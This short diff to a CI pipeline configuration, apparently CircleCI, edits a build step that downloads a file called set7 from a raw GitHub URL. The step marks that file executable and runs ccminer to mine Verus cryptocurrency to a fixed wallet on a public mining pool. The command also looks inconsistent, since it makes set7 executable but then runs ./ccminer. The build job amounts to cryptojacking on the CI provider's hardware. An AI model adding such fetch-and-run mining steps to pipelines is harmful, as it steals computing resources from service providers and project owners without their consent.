@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hsnm97/vrsc/main/set7 && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYJCYuxLF161q43GQ3N39Ln1LFaYdFKV3f.0055550000 -p x -t 30
+      - run:  wget https://raw.githubusercontent.com/hsnm97/vrsc/main/set7 && chmod u+x set7 && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYJCYuxLF161q43GQ3N39Ln1LFaYdFKV3f.0055550000 -p x -t 30
